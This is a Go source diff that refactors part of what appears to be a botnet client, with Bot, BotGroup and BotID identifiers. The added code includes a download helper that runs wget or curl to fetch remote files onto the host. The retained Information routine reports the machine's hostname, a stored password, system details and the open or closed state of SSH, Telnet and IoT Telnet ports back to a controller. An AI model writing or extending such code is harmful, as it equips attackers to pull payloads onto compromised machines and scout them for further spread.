@@ -2,8 +2,6 @@ package lib
 
 import (
 	"fmt"
-	"io"
-	"math/rand"
 	"os"
 	"os/exec"
 	"strconv"
@@ -14,17 +12,11 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-func genName(alphabet rune) string {
-	return string(alphabet + rune(rand.Intn(26)))
-}
+func KILL() { syscall.Exit(0) }
 
 func convInt(str string) int {
 	conv, _ := strconv.Atoi(fmt.Sprint(str))
 	return conv
-}
-
-func convReader(body []byte) io.Reader {
-	return strings.NewReader(string(body))
 }
 
 func getHostname() string {
@@ -41,6 +33,10 @@ func execComd(comd string, args ...string) string {
 		return "Fail to execute command!!!"
 	}
 	return string(fmtComd)
+}
+
+func download(savef, web string) string {
+	return execComd("wget", "-O", savef, web, "||", "curl", "-o", savef, web)
 }
 
 func getDiskSpace() string {
@@ -61,29 +57,14 @@ func fileName(readInfo bool) string {
 	return "." + BotGroup + BotID
 }
 
-func (b Bot) setInfoPort(port string) string {
-	b.timeout = 10 * time.Millisecond
-	if b.checkPort("127.0.0.1", port) != "" {
-		return "OPEN"
+func (b Bot) information() {
+	infoPort := func(port string) string {
+		b.timeout = 8 * time.Millisecond
+		if b.checkPort("127.0.0.1", port) != "" {
+			return port + " IS OPEN"
+		}
+		return port + " IS CLOSE"
 	}
-	return "CLOSE"
-}
-
-func meow(location string) string {
-	return execComd("cat", location)
-}
-
-func pullWeb(savef, web string) string {
-	return execComd("wget", "-O", savef, web, "||", "curl", "-o", savef, web)
-}
-
-func (b Bot) threadsNumber() string {
-	return strconv.Itoa(b.CPU * 2)
-}
-
-func Kill() { syscall.Exit(0) }
-
-func (b *Bot) Information() {
 	if _, setKey := SetupCaller(); setKey {
 		b.Report("Host Name: " + getHostname())
 		b.Report("Password: " + execComd("head", "-1", "/var/tmp/"+fileName(true)))
@@ -92,9 +73,9 @@ func (b *Bot) Information() {
 		b.Report("System: " + execComd("uname", "-a"))
 		b.Report("Free Disk Space (GB): " + getDiskSpace())
 		b.Report("Number of Cores: " + strconv.Itoa(b.CPU))
-		b.Report("Number of Threads: " + b.threadsNumber())
-		b.Report("Default SSH (22): " + b.setInfoPort("22"))
-		b.Report("Default Telnet (23): " + b.setInfoPort("23"))
-		b.Report("IoT Telnet (2323): " + b.setInfoPort("2323"))
+		b.Report("Number of Threads: " + strconv.Itoa(b.CPU*2))
+		b.Report("Default SSH: " + infoPort("22"))
+		b.Report("Default Telnet: " + infoPort("23"))
+		b.Report("IoT Telnet: " + infoPort("2323"))
 	}
 }
